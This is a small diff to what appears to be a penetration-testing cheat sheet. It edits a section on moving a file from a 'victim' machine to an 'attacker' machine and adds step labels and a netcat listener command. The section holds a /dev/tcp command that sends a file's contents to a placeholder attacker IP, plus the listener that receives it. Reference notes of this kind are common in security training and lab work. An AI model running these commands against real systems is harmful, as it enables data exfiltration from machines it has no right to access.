@@ -227,9 +227,13 @@ sudo ifconfig tun0 mtu 1200
 ```
 
 #### send a file from victim machine to attacker machine
-
+on the victim machine
 ```bash
 cat $file > /dev/tcp/<attacker ip>/<port>
+```
+on the attacker machine 
+```bash
+nc -nlvp <port> > filename
 ```
 
 ---
